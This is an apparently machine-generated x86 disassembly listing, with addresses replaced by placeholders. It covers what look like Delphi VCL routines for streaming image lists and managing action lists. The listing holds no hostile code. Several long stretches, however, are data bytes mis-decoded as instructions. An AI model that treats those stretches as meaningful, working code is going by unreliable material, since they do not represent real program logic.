sub_3abf738
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3abee18
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_3abf648
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_3abf794
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3a839f4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_3abf738
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3abf7ec
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_3a7cdc8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_3a7cdc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3abfa70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3a7cb9c
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_3a7cbbc
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3abfa53
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8e204
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_3a8f5a0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_3a78e1c
mov eax [ ebp - 0x4 ]
call sub_3abfe40
xor eax eax
push ebp
push sub_3abfa36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abfa3d
mov eax [ ebp - 0xc ]
call sub_3a64380
mov eax [ ebp - 0x14 ]
call sub_3a64380
mov eax [ ebp - 0x4 ]
call sub_3abfe44
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_3a78e44
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_3a8e7d8
push eax
mov eax [ ebp - 0xc ]
call sub_3a8e7d8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_3a89dd0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_3a78e44
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_3a8e7d8
push eax
mov eax [ ebp - 0x14 ]
call sub_3a8e7d8
lea edx [ ebp - 0x30 ]
pop ecx
call sub_3a89dd0
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_3abed4c
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_3abfa80
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a84180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3abfae0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3abebe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abfae7
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub eax 0xffffffec
sub_3abfae7
mov eax [ ebp - 0x4 ]
call sub_3abea4c
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3abfc17
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_3a7cbbc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_3a7d3b8
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_3a64380
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a84180
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3abfbfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3abebe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
sub eax 0xffffffec
movzx eax [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_3a7cbbc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_3abfc48
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_3abec74
mov eax edi
call sub_3a7cb9c
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
movzx ebx [ esp ]
and bl 0xff
movzx eax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_3a7cbbc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_3abf7ec
cmp bl 0x49
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3abec10
push eax
call ImageList_GetImageCount
push eax
mov eax esi
call sub_3abec10
push eax
call ImageList_SetImageCount
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_3abfa80
jmp r-xdata
call sub_3abdd24
call sub_3abde2c
test al al
jne r-xdata
sub_3abfcfc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a84180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3abfdf6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_3a6dbd4
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_3abec10
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_3abec10
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abfdfd
mov eax [ ebp - 0x4 ]
call sub_3a64380
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
jmp r-xdata
sub_3abfe64
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
mov edx esi
call sub_3abf5ac
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3abfec3
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1 ] dl
stosd [ edi ]
add esi [ eax - 0x1 ]
stosd [ edi ]
add esp [ eax ]
add [ eax ] al
cld
mov [ edi - 0x57c20ffd ] fs
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax ]
add al 0xac
add esi [ ebx + ebp * 4 + 0x39f403a7 ]
test al 0x3
shr [ edx + 0x3acc03a7 ] 0x1
test al 0x3
xor al 0x40
test al 0x3
cwde
add al 0xac
add edx esp
cmp ebp [ eax - 0x57c1f7fd ]
add ebp esp
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
mov [ edi ] bh
test al 0x3
hlt
sub_3abff62
lodsb [ esi ]
add edx [ ebp + eax + 0x47803ac ]
lodsb [ esi ]
add ecx [ eax + 0x1003ac04 ]
push esp
inc ebx
outsd
outsb
je r-xdata
or [ esp + edx * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0x8800408d
[ ebx + 0x54100703 ]
inc ebp
outsb
je r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
inc edx
popad
jae r-xdata
add esi [ eax - 0x4bfc53fa ]
stosd [ edi ]
arpl [ ecx + 0x63 ] ax
je r-xdata
cmpsd [ esi ] [ edi ]
add esi esp
cmp [ eax - 0x58552ffd ] ebp
add ecx esp
cmp ch [ eax - 0x53f82bfd ]
add ebx esp
cmp ch [ eax - 0x57c42bfd ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
inc esp
push es
lodsb [ esi ]
add ebx [ eax + 0x8 ]
lodsb [ esi ]
add edx [ edi + eax + 0x9a403ac ]
lodsb [ esi ]
add eax [ eax + eax ]
std
mov ah 0xab
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x3a78d ] ch
adc [ esi + 0x649003 ] ah
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
add [ ebx + eax ] ch
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffba03ac00 ]
add [ ebx + eax + 0x68 ] ch
sbb al 0x8b
cmpsd [ esi ] [ edi ]
add esi eax
cmp eax 0x45d403a8
sub_3ac00a4
stc
push ebx
push eax
inc [ eax ]
pop es
lodsb [ esi ]
add ecx [ eax + 0x7 ]
lodsb [ esi ]
add esp [ ecx + ecx - 0x54 ]
add eax [ ecx + ecx + 0x541103ac ]
inc ebx
jne r-xdata
cmpsb [ esi ] [ edi ]
je r-xdata
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add eax eax
les esp [ edi - 0x58544bfd ]
add eax [ eax + edi * 4 ]
cmpsd [ esi ] [ edi ]
fadd [ ebp - 0x5a ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add ebx esp
mov dh 0xa7
add edi [ eax - 0x39 ]
cmpsd [ esi ] [ edi ]
add ebp [ edi + eax * 8 - 0x384ffc59 ]
cmpsd [ esi ] [ edi ]
add esi [ edi + eax * 8 - 0x4513fc59 ]
cmpsd [ esi ] [ edi ]
add ebp [ ecx + ecx * 8 ]
cmpsd [ esi ] [ edi ]
add ecx [ eax + 0x5c03a7c9 ]
0x3a7
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb [ edi + 0x8000203 ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x1440000
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
add [ ebx + eax ] ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd [ ecx ]
lodsb [ esi ]
add edi [ eax ]
add [ eax ] al
add ah ch
and [ edi - 0x59ba37fd ] 0xa645d403
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
sub_3ac0316
out dx eax
inc [ ecx + edx ]
lodsb [ esi ]
add ebp [ ecx + edx ]
lodsb [ esi ]
add ecx [ 0x73754354 ]
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx esp
test al 0x3
fdivr [ esi ]
test al 0x3
adc [ edi ] bh
test al 0x3
jo r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
xor al 0x3
lodsb [ esi ]
add eax [ edi ]
or eax 0x73754354
je r-xdata
or ebp [ ebx + eax + sub_3ac0b14 ]
sbb [ ebx ] cl
lodsb [ esi ]
add ebx [ ebx + ecx ]
lodsb [ esi ]
add esp [ eax ]
or ebp [ ebx + eax + sub_3ac0b24 ]
sub [ ebx ] cl
lodsb [ esi ]
add ebp [ ebx + ecx ]
test al 0x3
inc esp
aas
test al 0x3
je r-xdata
add esi [ eax + 0x3f ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
pushfd
add ch [ ebx + eax + r-xdata ]
add eax [ eax ]
or [ ecx + 0x63 ] al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a83fcc
test bl bl
jle r-xdata
mov edx esi
call sub_3ac083c
or ebp [ ebx + eax + sub_3ac0b1c ]
and [ ebx ] cl
lodsb [ esi ]
add esp [ ebx + ecx ]
lodsb [ esi ]
add ebp [ eax ]
or ebp [ ebx + eax + sub_3ac0b2c ]
xor [ ebx ] cl
lodsb [ esi ]
add esi [ ebx + ecx ]
lodsb [ esi ]
add edi [ eax ]
or ebp [ ebx + eax + sub_3ac0b3c ]
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
test al 0x3
xchg esp eax
test al 0x3
sub [ edi ] bh
test al 0x3
jl r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x3a40000
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax ] bl
lodsb [ esi ]
add ebx [ eax ]
add [ eax ] al
add [ esp + ecx * 4 - 0x59 ] bh
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
add [ ebx + eax - 0x50 ] dh
add ebx eax
call sub_3a83a7c
retn
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5de85653
inc ebx
cli
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
outsd
lodsb [ esi ]
add esi [ eax ]
or ebp [ ebx + eax + sub_3ac0b34 ]
cmp [ ebx ] cl
lodsb [ esi ]
add edi [ ebx + ecx ]
lodsb [ esi ]
add ecx [ ebx ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
or ebp [ ebx + eax + sub_3ac0b28 ]
sub al 0xb
test al 0x3
dec eax
or ch [ ebx + eax + sub_3ac0a5c ]
jo r-xdata
lodsb [ esi ]
or ch [ ebx + eax + sub_3ac0ac0 ]
aam 0xa
lodsb [ esi ]
add ebp eax
or ch [ ebx + eax + sub_3ac0afc ]
adc [ ebx ] cl
lodsb [ esi ]
add edx [ ebx + ecx ]
lodsb [ esi ]
add ebx [ eax ]
lodsb [ esi ]
add eax [ edx + ecx + 0xa9803ac ]
lodsb [ esi ]
add ebp [ edx + ecx + 0xac003ac ]
lodsb [ esi ]
add edx esp
or ch [ ebx + eax + sub_3ac0ae8 ]
cld
or ch [ ebx + eax + sub_3ac0b10 ]
adc al 0xb
sub_3ac0428
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a83fcc
test bl bl
jle r-xdata
mov edx esi
call sub_3ac083c
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ac0498
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a83adc
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_3ac0540
sub_3ac04cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ac045c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_3a7a388
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_3a7a510
sub_3ac0514
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_3a652f4
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_3ac0540
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_3ac083c
mov edx ebx
mov eax esi
call sub_3ac081c
sub_3ac0568
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3ac0540
sub_3ac0594
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_3ad0c38
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_3a6457c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_3a84060
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_3aac66c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ac05ec
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_3ad0c60
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_3a6457c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_3a8407c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_3aac66c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ac0644
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3ac07c8
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac06b0
push ebx
push esi
push edi
call sub_3a6478c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_3a64380
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_3a7a57c
call sub_3a64380
mov eax [ edi + 0x30 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax edi
call sub_3a836b0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3a64734
sub_3ac0700
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_3ac0748
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a7a4f0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov edx edi
call sub_3ac04cc
sub_3ac0794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_3abf5ac
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_3abf5f0
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_3a83738
sub_3ac07d4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_3a83994
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_3ac083c
sub_3ac081c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a7a33c
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_3a83738
pop esi
pop ebx
retn
sub_3ac083c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_3a7a630
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_3ac0858
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x298 ] 0x0
je r-xdata
mov eax [ esi + 0x298 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_3ac08c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
call sub_3aa7e54
test al al
jne r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
call sub_3ac44fc
mov ebx eax
movzx eax [ esi + 0x4 ]
mov edx ebx
